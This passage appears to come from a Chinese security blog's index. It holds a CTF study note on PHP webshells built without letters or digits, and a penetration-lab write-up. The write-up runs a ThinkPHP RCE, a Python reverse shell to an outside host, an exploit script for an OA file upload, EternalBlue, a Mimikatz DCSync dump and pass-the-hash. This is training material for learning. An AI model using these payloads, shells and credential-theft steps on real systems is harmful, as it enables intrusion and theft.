7d1f08bf317d72e341d2432731e732436b3cb55e463716a95fcb301796036dcdc5a25e6739f465d0ce0173c4b658f27082e9cf7c6b0315df046ca58168b172943142f4faf197cf790be1e6ce6a2f04e5740fd75aa91508b8220cd449a54194708961e3bd42be987f5f8ad2f7e1b9a5f64a197af7938533e3d45b86e1d1cb148c1345bd4a609e68170c88d88d2bf0c41eb7797f68fee7d9fa9b23c1f5d40123eb6062909e75df944aa397161a81e656acc60e5d97dc301b76b16bf4fe625dc1f7ad19053213d299ed4f52ef3435840581d1cb97e476afda847fa75f32cf874064cdb3168e283e4a8a9ff22292ff0c4979c3ee81cb1dc5c19ec4e9e7540e9be4a5d17ef2ee6d4cc059cc2f90be5dfd9030cd0d3b68ec4fbf9770fa6601f708d9389c3e10716a906427099e632dc2fdf6fe3072901e568a40b268450925209d06f143b1133e0d04109faa541eaf8b39b89f86ab81a121b7e84d5c215272cc3f1816656cababb4475f4c524ebc408c575e362cb1cfaf18e21bda54bb23d5e5e9000dfdaee758ff146a1485957200cfd2ee419649ea5d996ad0a812cde069107d313d345e2e63ffada3502ff850d0a21009d0bceea9661997300f53917503b32365d230ac4b9bc33ad6f7cf6d142805055e2e435d61b46dff21468c4790a2273b0e4ecf996872dff8832a73a31b18dc1fb8f87e05a83d44e1043aa86b3b51c7388e148b5be1f6243623a1ba48a6b9ed54d8d96a4d5793c5c5e62d80d67785475b1546cebe81fbb6bd27eaf154e77bc0d160857303f3b6552a34006bd40afaf84a8ede1a94069dcf4afc7a07d8017feb9952afb3e3307d81d2564d320494bf876ad75a15edf3c0d35ebd69666a21e7bf7f4a388712b6966fd527a1fa0ae5357145ebdb5e74738e2c18474a9c4f9d6453835654a80e9f3ece5e222d8433e51905d05958d7fa5c3e7616f73cddb9acf9e57a7607f594d19ff1e48d6930e2a4fbbb67b1497ba09dbb91f7bc56be273209e49dc18ff378373b4c3d9758ab19063f36412f51e90b1611cbf042f0f16d82e52dff44cd97dada0180226baa2bb4aa55b3fc1fb413d8053f561e2ad7cc5965d547f5e31e4a270de6431ff1e0ddaa3bc5d8fe7711f6f8855fb89358ed858cffcf725182fe300629c88f78081978c7bf26f07533da0f7e396c37688c1aa5102ba0b3b21c65bf10eda06ba8f946a58a63b0ffde74cdc700c59794a41a11727dc5c0a31fe90bbdb5e53429f100d49f8a81d2143ad6da12145a9084ccd199b359a8f3e078901cd443d6aea3d1b396ca5272cda23253a7d5bb89c198ba840f05f6359f88b3baf986d82cd6d815e6576f736f00aa88bd8fe1e4ed085d3a550961ab4bb0aa55896ed8d4588808a3fb942acec9d4edd2c068d80ccd48e3bcba9933ff17a94675a5180c31b4ed8896f942db64af53559fdd12f1591ca818848d67dff238dafc7f9a0b093807bd99cbd3d9dc05a99b97d429cae29dd0864bd5b41571dbeee10eedb9573bbc27be4b15e75fcf0b2b450d1dcf3cf9c467ec4db774f9ecbc221add88588163cd94bec0e6b5c0aeef791ac2c619e229e198bb7d35bc63948fa093483986a631ff29d4b572d15f20030e374b33962cb938e35f048cbcd65c08941baa090f597e60b1f9f8f892011d0f379fcd94097e5b70b634356faac4930f5c1698578f5de02ff618baff901d662110298e06137648288809b0110d13fa148caf00b8ebd24050f452977eba358ce79a35f6e2ca5d9d5688c28f9b9c13508d4b17d6d8aba420a4a5237a4fa970f64fddb8079e6b91b19aae15d5a255da30d552c22bcbe064751b0a6c997c9be927e0f0492dc173e936dd1fc8d059c16f8e736cf4e3ba9004b0ae000d61ee1e8d5543d86feab98ab91e44e9e508bbd7e0a2fbb6688405e255f78ea85fc9a89a8cebff842995bf3918c47081fcdcdcad2aed9283e85a73b02532bcfe86be304f7e9554f99b76341c1d7eb01f0e58936848b6ae9f82df2fe755a078fc97f733a16dec1fbdc611e18f6cc82dbda1bda00f868efd30acd59ada251d72e16ac7e7cdc71611f0e2cf033f9019c6d05725f2ed7f8f29eaa645a89fe50ed1134431e89582830dc8ff15e7a10489c9b5d312d150a1cd42250e972604561d09b653d113fe1f2b2a3841685d25186007071a6b660f0731feb94e5385fbe01e6d280616d941a9cfadc34f80c2982a200d314fc97db8e3f79f264f85f4b542b611eae66c7f61b82f7c4aece90b3a6624339edb391c8894219a3f20783633ad30bb9b02c474b5c0c2675aff9c8761cdf0a81820bccd26635084101303a6ebdc455ac5bb9858a6525ce954b090beb70e3c6d5f5c236076634aed0d9177faa11591c037f9fb08d7d27fd4892cc0d4a14e3e5f9e2470006e1c96fdd0757d07b09475059aee88f2a57b74c8020f898dfd122536c7798d4323b62eb766d4e2ee2fc16d1c8bd27a75c6e955590734bf7fa6146dd004d08e7fb663c6ef2435d7d0044893da282bc8dab6073dd366759239debf0194bb3119a469deecbb5ed47a3ef07e40f7c57bbe76ed5198f3ee4587749a5a190f7289aeeac9c61b009c0b711e1b582b4ae1a0007467ba502d8e31cd17b2bea0a631053c0e2da0a8e1aa13671af2d53959ed52d2ed5d823296c55a882b92bd753cd68faf1902e58dd872f5e01d58f9714e5a7c93b773c0e7fffef0f102b6aa06d8ef86ff51e3e22e1b78aeee82e6ecf3537ab62567791671bc6b7581a5b4b489e60581b7eda6ac10403f269d3b77299c71b05039bc16d98bdf01ff2f3fb225c0c54a516ad12fdc7cb0ee66660b8d2bc49fa9c37e94e4794c8c5102148952c72742e7150ce45b1c25ebc4d5ea5e1f028b85f6b15bbf454e47d8762095192b7e96dfb4001d5e74a5ad04126e6ed106127be55f9dc6a84aec88d6bd066b9a4cf6c171330bce988495fea24a1837e006af909ea8f636ab797b5702e208d2d28657b067ffa612926b595465e064a47d97e455346eeab2678e3634cc90a6d33cab38d51686a2f18a2730327f3b78213edbe059dd0fed5e78f6c5c7de85ea6264ff39cdbca14ec26c8586d4e01f469c6077ddd24504724401e3b5bf9e3a26f18f8c13d823e13bb7c06455a7092dd8ebc6046895caca147a0f4f6d607060cf78b1c5f32d33b7a5a628dca59657c7cbcc2f0cdcd66efabe6ad1dfb2e07b2d513907d9ea52633f33396140f9e230a93c93857876b585c61500291cb0676a2114caccc1e41f688709961447de10d21225d3b29981ea70f78f4085a9c254f1b199807befea943513ec9adb2ed8021b9da66d5f63b36df8b03b6218735770273ebb8435199a61c1b189f344dde4b7e5d9c1d33ae779f1bf761b801d833608097e7ee5f9aa8be9bfd7aad597fce011fbaa7f6a0e084e4edd355d4fc06a318482d6f586b0d28220be450df83e26bd29317bf630715a865d42b758ebf706cf232f776f4010f55789e70ec72bffcdf70ee1c67d4c58362773a6e48da58e00469d97a363c5d5a2ebf1dd7113a0972742f26fcf11976a29435b42973921633489e3b2921206ddf314700f400eab813944ff4ab46912b1a03a876a917708656618c303461b1a8f7577ab9fb1f0fda46720aa4c9907f1ffa15fde57b15ccb53cd89f6c392b94d54e46c8a0b4c0bb9de67611da9264abee5b1ce9d6ad87248dfa108d5cd7934e3bff597a68d07d17cbd2b3f4f18583483e21a963a49baae14848724e3e17a94ec1808ab6534b3f3af4753aa2f3e7341bf14e69bba707b79e3c468989739d28b097e88558697d2cddea528114d972b6eded5cc6047c17ee0e9a245335ea376c0d3e1cef63495308883e6a2d7a922bc7d1d2733b1d94850c53765c719cc895b2a5bd254a96d4e264768b88e6f2a36b558ae3a755a181f8a9a48bc540b3807ad3bd3491893db062e2601dc336206978160f700020c4fe9c5983bfcb76a8ec2e23b591737099b6ff1103881c8ef5c6f5adc93747096a315c8da939ef64ca6557c13fad75a2be8f99003bdc0cd8d6ef560a17c109cd56c028b4feb7ac662ab40bf0e124f75a74295051f034fe3ed565b501270440abf78c20af9bf12dd133538607c405e110b3e4aba4c3b5a3a0def1b1d8ebe1934988e02737c3ec40
  
    
      
      
        请输入密码
      
    
  

]]></content>
  </entry>
  <entry>
    <title>无字母数字webshell学习</title>
    <url>/2024/08/14/%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97webshell%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[引用本文是根据P神的两篇文章进行学习，分别是一些不包含数字和字母的webshell以及无字母数字webshell之提高篇
浅析CTF绕过字符数字构造shell
第一个问题&lt;?phpif(!preg_match(&#x27;/[a-z0-9]/is&#x27;,$_GET[&#x27;shell&#x27;])) &#123;    eval($_GET[&#x27;shell&#x27;]);  &#125;else&#123;    highlight_file(__FILE__);&#125;

题目在eval()前进行过滤，那我们就得在eval()里得到正常的webshell语句并执行。eval()允许多语句（可分号），这就为我们得到正常的webshell语句提供了很大的操作空间。
首先，核心思路便是将非字母、数字的字符经过各种变换，最后能构造出a-z中任意一个字符。然后再利用PHP允许动态函数执行的特点，拼接处一个函数名，如“assert”，然后动态执行之即可
php5中assert是一个函数，我们可以通过$f=&#39;assert&#39;;$f(...);这样的方法来动态执行任意代码。
但php7中，assert不再是函数，变成了一个语言结构（类似eval），不能再作为函数名动态执行代码，所以利用起来稍微复杂一点。但也无需过于担心，比如我们利用file_put_contents函数，同样可以用来getshell。
该题本文用的是php5的环境
异或在PHP中，两个字符串执行异或操作以后，得到的还是一个字符串。所以，我们想得到a-z中某个字母，就找到某两个非字母、数字的字符，他们的异或结果是这个字母即可
因此我们可以通过该种方法构造出攻击语句，如下：
&lt;?php$_=(&#x27;%01&#x27;^&#x27;`&#x27;).(&#x27;%13&#x27;^&#x27;`&#x27;).(&#x27;%13&#x27;^&#x27;`&#x27;).(&#x27;%05&#x27;^&#x27;`&#x27;).(&#x27;%12&#x27;^&#x27;`&#x27;).(&#x27;%14&#x27;^&#x27;`&#x27;); // $_=&#x27;assert&#x27;;$__=&#x27;_&#x27;.(&#x27;%0D&#x27;^&#x27;]&#x27;).(&#x27;%2F&#x27;^&#x27;`&#x27;).(&#x27;%0E&#x27;^&#x27;]&#x27;).(&#x27;%09&#x27;^&#x27;]&#x27;); // $__=&#x27;_POST&#x27;;$___=$$__;$_($___[_]); // assert($_POST[_]);

由于含有不可见的字符，所以url编码了
拿去执行，结果如下：

p神的异或有点难，所以我自己网上找到了一个异或的脚本，如下：
&lt;?phpfor($i=128;$i&lt;255;$i++)&#123;    echo sprintf(&quot;%s^%s&quot;,urlencode(chr($i)),urlencode(chr(255))).&quot;=&gt;&quot;. (chr($i)^chr(255)).&quot;\n&quot;;&#125;?&gt;

运行该脚本我们知道
%81^%FF=&gt;~     %82^%FF=&gt;&#125;       %83^%FF=&gt;|%84^%FF=&gt;&#123;     %85^%FF=&gt;z       %86^%FF=&gt;y%87^%FF=&gt;x     %88^%FF=&gt;w       %89^%FF=&gt;v%8A^%FF=&gt;u     %8B^%FF=&gt;t       %8C^%FF=&gt;s%8D^%FF=&gt;r     %8E^%FF=&gt;q       %8F^%FF=&gt;p%90^%FF=&gt;o     %91^%FF=&gt;n       %92^%FF=&gt;m%93^%FF=&gt;l     %94^%FF=&gt;k       %95^%FF=&gt;j%96^%FF=&gt;i     %97^%FF=&gt;h       %98^%FF=&gt;g%99^%FF=&gt;f     %9A^%FF=&gt;e       %9B^%FF=&gt;d%9C^%FF=&gt;c     %9D^%FF=&gt;b       %9E^%FF=&gt;a%9F^%FF=&gt;`     %A0^%FF=&gt;_       %A1^%FF=&gt;^%A2^%FF=&gt;]     %A3^%FF=&gt;\       %A4^%FF=&gt;[%A5^%FF=&gt;Z     %A6^%FF=&gt;Y       %A7^%FF=&gt;X%A8^%FF=&gt;W     %A9^%FF=&gt;V       %AA^%FF=&gt;U%AB^%FF=&gt;T     %AC^%FF=&gt;S       %AD^%FF=&gt;R    %AE^%FF=&gt;Q     %AF^%FF=&gt;P       %B0^%FF=&gt;O%B1^%FF=&gt;N     %B2^%FF=&gt;M       %B3^%FF=&gt;L%B4^%FF=&gt;K     %B5^%FF=&gt;J       %B6^%FF=&gt;I%B7^%FF=&gt;H     %B8^%FF=&gt;G       %B9^%FF=&gt;F%BA^%FF=&gt;E     %BB^%FF=&gt;D       %BC^%FF=&gt;C%BD^%FF=&gt;B     %BE^%FF=&gt;A       %BF^%FF=&gt;@%C0^%FF=&gt;?

因此到时候做的时候需要什么字符就只要直接从上面的式子进行拼接就好了
取反与法一思路一致，都是通过字符变换实现webshell。不过这里采用取反的思想，并且在Hackbar上要手动编码一次
取反的符号是~，也是一种运算符。在数值的二进制表示方式上，将0变为1，将1变为0
当我们自己直接尝试对phpinfo进行取反的时候，会产生不可见字符，因此需要取反后再进行一次url编码
取反的脚本如下：
&lt;?php$a = urlencode(~&#x27;phpinfo&#x27;);echo $a;//%8F%97%8F%96%91%99%90

脚本
&lt;?php$shell = &quot;assert&quot;;$result1 = &quot;&quot;;$result2 = &quot;&quot;;for($num=0;$num&lt;=strlen($shell);$num++)&#123;    for($x=33;$x&lt;126;$x++)    &#123;        if(judge(chr($x)))        &#123;            for($y=33;$y&lt;=126;$y++)            &#123;                if(judge(chr($y)))                &#123;                    $f = chr($x)^chr($y);                    if($f == $shell[$num])                    &#123;                        $result1 .= chr($x);                        $result2 .= chr($y);                        break 2;                    &#125;                &#125;            &#125;        &#125;    &#125;&#125;echo $result1;echo &quot;&lt;br&gt;&quot;;echo $result2;function judge($c)&#123;    if(!preg_match(&#x27;/[a-z0-9]/is&#x27;,$c))    &#123;        return true;    &#125;    return false;&#125;

这个脚本可以将“assert”变成两个字符串异或的结果，通过更改shell的值可以构造出我们想要的字符串。为了便于表示，生成字符串的范围为33-126（可见字符）。
&lt;?php$_ = &quot;!((%)(&quot;^&quot;@[[@[\\&quot;;   //构造出assert$__ = &quot;!+/((&quot;^&quot;~&#123;`&#123;|&quot;;   //构造出_POST$___ = $$__;   //$___ = $_POST$_($___[_]);   //assert($_POST[_]);

?shell=%24_+%3d+%22!((%25)(%22^%22%40[[%40[\\%22%3b%24__+%3d+%22!%2b%2f((%22^%22~&#123;`&#123;|%22%3b%24___+%3d+%24%24__%3b%24_(%24___[_])%3b


将所有字符进行编码：?shell=%24%5f%3d%22%21%28%28%25%29%28%22%5e%22%40%5b%5b%40%5b%5c%5c%22%3b%24%5f%5f%3d%22%21%2b%2f%28%28%22%5e%22%7e%7b%60%7b%7c%22%3b%24%5f%5f%5f%3d%24%24%5f%5f%3b%24%5f%28%24%5f%5f%5f%5b%5f%5d%29%3b

自增在不利用位运算符的前提下，解决这道题
众所周知：&#39;a&#39;++ =&gt; &#39;b&#39;，&#39;b&#39;++ =&gt; &#39;c&#39;… 所以，我们只要能拿到一个变量，其值为a，通过自增操作即可获得a-z中所有字符。
那么，如何拿到一个值为字符串’a’的变量呢？
巧了，数组（Array）的第一个字母就是大写A，而且第4个字母是小写a。也就是说，我们可以同时拿到小写和大写A，等于我们就可以拿到a-z和A-Z的所有字母。
在PHP中，如果强制连接数组和字符串的话，数组将被转换成字符串，其值为Array
因为在Php中大小写不敏感，所以我们得到A就可以了，最终执行的是ASSERT($_POST[_])，无需获取小写a）：
&lt;?php$_=[];$_=@&quot;$_&quot;; // $_=&#x27;Array&#x27;;$_=$_[&#x27;!&#x27;==&#x27;@&#x27;]; // $_=$_[0];$___=$_; // A$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__; // S$___.=$__; // S$__=$_;$__++;$__++;$__++;$__++; // E $___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // R$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T$___.=$__;$____=&#x27;_&#x27;;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // P$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // O$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // S$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T$____.=$__;$_=$$____;$___($_[_]); // ASSERT($_POST[_]);

编码，执行结果如下：

第二个问题（加强版）&lt;?phpif(isset($_GET[&#x27;code&#x27;]))&#123;    $code = $_GET[&#x27;code&#x27;];    if(strlen($code)&gt;35)&#123;        die(&quot;Long.&quot;);    &#125;    if(preg_match(&quot;/[A-Za-z0-9_$]+/&quot;,$code))&#123;        die(&quot;NO.&quot;);    &#125;    eval($code);&#125;else&#123;    highlight_file(__FILE__);&#125;

该题是在环境为php 7.2下进行的
这道题多了两个限制：

webshell长度不超过35位
除了不包含字母数字，还不能包含$和_

难点呼之欲出了，前面的所有方法，都用到了PHP中的变量，需要对变量进行变形、异或、取反等操作，最后动态执行函数。但现在，因为$不能使用了，所以我们无法构造PHP中的变量
php7中修改了表达式执行的顺序：http://php.net/manual/zh/migration70.incompatible.php ：

PHP7前是不允许用($a)();这样的方法来执行动态函数的，但PHP7中增加了对此的支持。所以，我们可以通过(&#39;phpinfo&#39;)();来执行函数，第一个括号中可以是任意PHP表达式。
所以很简单了，构造一个可以生成phpinfo这个字符串的PHP表达式即可。payload如下（不可见字符用url编码表示）：
(~%8F%97%8F%96%91%99%90)();


但是要是在php5的环境下要怎么办呢，上述的payload是不起作用的
PHP5+shell打破禁锢本人认为p神对于这个的见解是非常厉害的，十分值得我们学习

确实如他所言，反引号也不属于字母数字，所以我们可以直接利用它来执行系统命令，但是呢：如何利用无字母、数字、$的系统命令来getshell？
P神指了出来两个有趣的Linux shell知识点：

shell下可以利用.来执行任意脚本
Linux文件名支持用glob通配符代替

.或者叫period，它的作用和source一样，就是用当前的shell执行一个文件中的命令。比如，当前运行的shell是bash，则. file的意思就是用bash执行file文件中的命令。
用. file执行文件，是不需要file有x权限的。那么，如果目标服务器上有一个我们可控的文件，那不就可以利用.来执行它了吗？
第二个难题接踵而至，执行. file，也是有字母的。此时就可以用到Linux下的glob通配符：

*可以代替0个及以上任意字符
?可以代表1个任意字符

那么，就可以表示为/*/?????????或/???/?????????。
但我们尝试执行. /???/?????????，却得到如下错误：


这是因为，能够匹配上/???/?????????这个通配符的文件有很多，我们可以列出来:

那么我们要得到我们需要的文件，就必须进行过滤，有两个方法可以帮助我们：

glob支持用[^x]的方法来构造“这个位置不是字符x”
跟正则表达式类似，glob支持利用[0-9]来表示一个范围

（具体上述两种如何操作建议查看p神的文章，这里就不一一赘述了）
在实现了以上过滤后，便可以执行任意命令了，如p神的一个例子：
?code=?&gt;&lt;?=`. /???/????????[@-[]`;?&gt;



成功执行任意命令
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
  </entry>
  <entry>
    <title>春秋云镜-initial</title>
    <url>/2025/08/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-initial/</url>
    <content><![CDATA[参考春秋云境Initial WP
前言这靶场说难也不是很难，主要就是要熟悉各种工具的应用，配置等，这些都需要耗费不少的时间
靶标介绍Initial是一套难度为简单的靶场环境，完成该挑战可以帮助玩家初步认识内网渗透的简单流程。该靶场只有一个flag，各部分位于不同的机器上
flag01首先拿到站点，就一个登录框什么都没有，点击注册也没有任何反应，随便尝试了几个弱口令也都没有反应
看了眼网站的icon，是thinphp，于是就先直接上thinkphp的工具

检测到有相关的rce漏洞，直接getshell，再用蚁剑连上


蚁剑里面有一个虚拟终端的功能可以使用，但是经过我前四个钟头血的教训，这功能是真的不好用，命令难执行，还会吞回显等等，白白浪费了好几个沙漏（都是钱啊
后面中途转去学了下linux提权和如何升级为完全式shell后，决定直接弹到自己的vps上来操作（舒服多了
自己vps上监听：nc -lvvp 2333
在机子的虚拟终端上反弹shell
python3 -c &#x27;import socket,subprocess,os;s=socket.socket();s.connect((&quot;1.1.1.1&quot;,2333));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;])&#x27;

经过一顿操作转为完全式shell
先查了下自己的权限，发现挺低的，于是准备提权，这里用sudo进行提权

mysql具有root权限，并且不需要密码就可以，去GTFOBins查一下

-e然后后面可以执行shell命令，然后查找flag，sudo mysql -e &#39;\! find / -name *flag*&#39;,找到后直接cat，flag01如下：

flag02开始在内网进行信息收集，在蚁剑中上传一下fscan工具，并赋一下执行权限：chmod +x fscan_amd64
先ifconfig查一下自己的内网ip

然后扫描一手
www-data@ubuntu-web01:/var/www/html$ ./fscan_amd64 -h 172.22.1.0/24   ___                              _      / _ \     ___  ___ _ __ __ _  ___| | __  / /_\/____/ __|/ __| &#x27;__/ _` |/ __| |/ // /_\\_____\__ \ (__| | | (_| | (__|   &lt;    \____/     |___/\___|_|  \__,_|\___|_|\_\                        fscan version: 1.8.2start infoscantrying RunIcmp2The current user permissions unable to send icmp packetsstart ping(icmp) Target 172.22.1.2      is alive(icmp) Target 172.22.1.15     is alive(icmp) Target 172.22.1.18     is alive(icmp) Target 172.22.1.21     is alive[*] Icmp alive hosts len is: 4172.22.1.18:3306 open172.22.1.21:445 open172.22.1.18:445 open172.22.1.2:445 open172.22.1.21:139 open172.22.1.18:139 open172.22.1.2:139 open172.22.1.21:135 open172.22.1.18:135 open172.22.1.2:135 open172.22.1.18:80 open172.22.1.15:80 open172.22.1.15:22 open172.22.1.2:88 open[*] alive ports len is: 14start vulscan[*] NetInfo:[*]172.22.1.21   [-&gt;]XIAORANG-WIN7   [-&gt;]172.22.1.21[*] NetInfo:[*]172.22.1.2   [-&gt;]DC01   [-&gt;]172.22.1.2[*] NetInfo:[*]172.22.1.18   [-&gt;]XIAORANG-OA01   [-&gt;]172.22.1.18[*] NetBios: 172.22.1.2      [+]DC DC01.xiaorang.lab             Windows Server 2016 Datacenter 14393 [*] WebTitle: http://172.22.1.15        code:200 len:5578   title:Bootstrap Material Admin[*] 172.22.1.2  (Windows Server 2016 Datacenter 14393)[+] 172.22.1.21	MS17-010	(Windows Server 2008 R2 Enterprise 7601 Service Pack 1)[*] NetBios: 172.22.1.21     XIAORANG-WIN7.xiaorang.lab          Windows Server 2008 R2 Enterprise 7601 Service P[*] NetBios: 172.22.1.18     XIAORANG-OA01.xiaorang.lab          Windows Server 2012 R2 Datacenter 9600 [*] WebTitle: http://172.22.1.18        code:302 len:0      title:None 跳转url: http://172.22.1.18?m=login[*] WebTitle: http://172.22.1.18?m=login code:200 len:4012   title:信呼协同办公系统[+] http://172.22.1.15 poc-yaml-thinkphp5023-method-rce poc1已完成 14/14[*] 扫描结束,耗时: 13.334454435s

扫出4台存活的机子，其中有一台我们已经打过了
这里我们选择对信呼这台机子下手
但是这是内网的机子，我们外面不能直接访问，所以就需要通过frp反代出来进行访问
frp相关操作参考：https://blog.csdn.net/weixin_43400024/article/details/139986585
这里服务端便是我自己的vps，开启监听

客户端也就是靶机，执行：&#96;frpc.exe -c frpc.toml


然后在本机配置一下proxifier进行访问，因为我们这边都是socks5进行连接，直接http协议是访问不了的
添加代理服务器

配置代理规则

Default规则的动作要选择direct，这样子除了访问172.22.*.*的机子之外访问其他的都是默认的，跟平常一样
全部配置完后访问http://172.22.1.18/，成功，直接默认的账户密码登录admin-&gt;admin123

信呼低版本存在rce漏洞，讲解网上一搜一大堆
信呼OA qcloudCosAction.php 任意文件上传漏洞
这里直接贴exp
import requestssession = requests.session()url_pre = &#x27;http://172.22.1.18/&#x27;url1 = url_pre + &#x27;?a=check&amp;m=login&amp;d=&amp;ajaxbool=true&amp;rnd=533953&#x27;url2 = url_pre + &#x27;/index.php?a=upfile&amp;m=upload&amp;d=public&amp;maxsize=100&amp;ajaxbool=true&amp;rnd=798913&#x27;# url3 = url_pre + &#x27;/task.php?m=qcloudCos|runt&amp;a=run&amp;fileid=&lt;ID&gt;&#x27;data1 = &#123;    &#x27;rempass&#x27;: &#x27;0&#x27;,    &#x27;jmpass&#x27;: &#x27;false&#x27;,    &#x27;device&#x27;: &#x27;1625884034525&#x27;,    &#x27;ltype&#x27;: &#x27;0&#x27;,    &#x27;adminuser&#x27;: &#x27;YWRtaW4=&#x27;,    &#x27;adminpass&#x27;: &#x27;YWRtaW4xMjM=&#x27;,    &#x27;yanzm&#x27;: &#x27;&#x27;    &#125;r = session.post(url1, data=data1)r = session.post(url2, files=&#123;&#x27;file&#x27;: open(&#x27;1.php&#x27;, &#x27;r+&#x27;)&#125;)filepath = str(r.json()[&#x27;filepath&#x27;])filepath = &quot;/&quot; + filepath.split(&#x27;.uptemp&#x27;)[0] + &#x27;.php&#x27;print(filepath)id = r.json()[&#x27;id&#x27;]url3 = url_pre + f&#x27;/task.php?m=qcloudCos|runt&amp;a=run&amp;fileid=&#123;id&#125;&#x27;r = session.get(url3)r = session.get(url_pre + filepath + &quot;?1=system(&#x27;dir&#x27;);&quot;)print(r.text)

拿到返回的路由，直接蚁剑连上
拿到flag02

flag03接下来开始打永恒之蓝，配置好proxychains，让其conf文件加上 socks5 1.1.1.1 6028

然后执行如下命令：
proxychains msfconsoleuse exploit/windows/smb/ms17_010_eternalblueset payload windows/x64/meterpreter/bind_tcpshow options set rhosts 172.22.1.21run

成功拿到shell

接下来开始横向
load kiwi

加载成功后，你就可以在 Meterpreter 里使用一系列 Mimikatz 风格的命令，常见功能包括：

凭据抓取
creds_all → 列出所有能获取的凭据（明文密码、哈希、票据等）
creds_msv → 抓取 MSV 认证凭据（NTLM 哈希）
creds_ssp → 抓取 SSP 认证信息
creds_wdigest → 抓取 WDigest 明文密码
creds_kerberos → 抓取 Kerberos 票据


哈希 &#x2F; 票据操作
kerberos_ticket_list → 列出现有的 Kerberos 票据
kerberos_ticket_purge → 清除票据
kerberos_ticket_use → 导入票据（Pass-the-Ticket）


其他典型操作
golden_ticket_create → 生成黄金票据
kerberos_ticket_use → 使用票据
lsa_dump_sam → 导出 SAM 数据库



kiwi_cmd lsadump::dcsync /domain:xiaorang.lab /all /csv

kiwi_cmd

在 Meterpreter 中，kiwi_cmd 用来直接执行 mimikatz 原生命令。
相当于你在目标机上运行 mimikatz.exe，然后输入 lsadump::dcsync ...。

lsadump::dcsync

这是 Mimikatz 的 DCSync 模块。
功能：伪装成一个域控制器，通过调用 MS-DRSR (Directory Replication Service Remote Protocol) 协议，从真正的域控同步凭据。
本质上就是远程向域控请求用户 NTLM 哈希、Kerberos 密钥等数据。

/domain:xiaorang.lab

指定目标域为 xiaorang.lab。
必须是有效的 AD 域。

/all

导出域中所有用户的凭据（包括 krbtgt、管理员等）。
如果不加，只会导出指定账户。

/csv

以 CSV 格式输出结果，方便后续保存、解析或导出。


由于是刚接触，扫出的这些有必要拿ai辅助解释一手，这些都是抓取到的域用户凭据（NTLM 哈希）
输出的格式如下：
&lt;用户RID&gt;   &lt;用户名&gt;   &lt;NTLM哈希&gt;    &lt;用户属性标志&gt;

RID（Relative Identifier）

每个域用户在域里的唯一 ID。
常见特殊 RID：
500 → 域管理员 Administrator
502 → krbtgt 账户（Kerberos 的关键账户，用于票据签发）
1000+ → 普通域用户&#x2F;计算机账户



用户名

比如 Administrator、Marcus、Charles。

NTLM 哈希

这是用户密码的 NTLM 哈希，可用于：
Pass-the-Hash (PtH) 横向渗透
爆破还原明文（hashcat &#x2F; john）



属性标志（UserAccountControl 值）

这是用户账户属性的整数表示（十进制）。
常见值：
512 → 普通启用的域用户
514 → 账户禁用
4096 → 工作站 &#x2F; 服务器的机器账户
532480 → 域控服务器账户



而我们扫到的结果分析如下：

502  krbtgt
域的 Kerberos 根密钥账户，哈希可用于伪造 **黄金票据 (Golden Ticket)**。


500  Administrator
域管理员，拿到这个哈希 &#x3D; 拿下整个域。


1106 Marcus / 1107 Charles
普通域用户，可以尝试横向渗透。


1000 DC01$
域控制器机器账户。也能用于 DCSync。


1104 XIAORANG-OA01$ / 1108 XIAORANG-WIN7$
域内主机的机器账户。



hash传递，拿到flag
proxychains crackmapexec smb 172.22.1.2 -u administrator -H10cf89a850fb1cdbe6bb432b859164c8 -d xiaorang.lab -x &quot;type Users\Administrator\flag\flag03.txt&quot;

crackmapexec smb 172.22.1.2

对目标 172.22.1.2 主机发起 SMB 协议 连接。

-u administrator

使用域账户 administrator。

-H 10cf89a850fb1cdbe6bb432b859164c8

使用 NTLM 哈希 进行身份验证（即 Pass-the-Hash 技术）。
这里的哈希来自你前面 DCSync 抓取的结果。

-d xiaorang.lab

指定域名 xiaorang.lab。

-x &quot;type Users\Administrator\flag\flag03.txt&quot;

成功认证后，在目标机上执行命令

该命令的过程就是Pass-the-Hash → SMB 执行命令 → 读 flag 文件

这里再解释一下为什么使用SMB协议来进行连接

作用：在局域网内提供文件共享、打印机共享、IPC（进程间通信）、远程管理等功能。
端口：
445&#x2F;tcp → 现代 SMB (直连 TCP)
139&#x2F;tcp → 旧版 SMB (基于 NetBIOS)



Windows 系统中几乎必开 SMB 服务，因为它支撑着：

\\IP\C$ → 共享磁盘
\\IP\ADMIN$ → 管理共享
\\IP\IPC$ → 远程管理、RPC 调用

那么为什么能通过SMB协议来远程执行命令，这主要是因为Windows 的 远程管理 很大程度依赖 SMB，例如：

**IPC$**：远程调用进程&#x2F;服务
**ADMIN$ &#x2F; C$**：访问系统目录
服务控制 (SCM) 可以通过 SMB 启动新服务
任务计划 (AT&#x2F;SCHTASKS) 可以通过 SMB 下发任务

总结总flag：flag&#123;60b53231-2ce3-4813-87d4-e8f88d0d43d6&#125;
第一次打这种靶场，即使是看着网上的wp进行操作依旧耗费了很久，主要原因就是对于工具的不熟悉以及蚁剑那极其不好用的虚拟终端
]]></content>
      <categories>
        <category>Write-Up</category>
      </categories>
  </entry>
  <entry>
    <title>服务器上配置重定向文件</title>
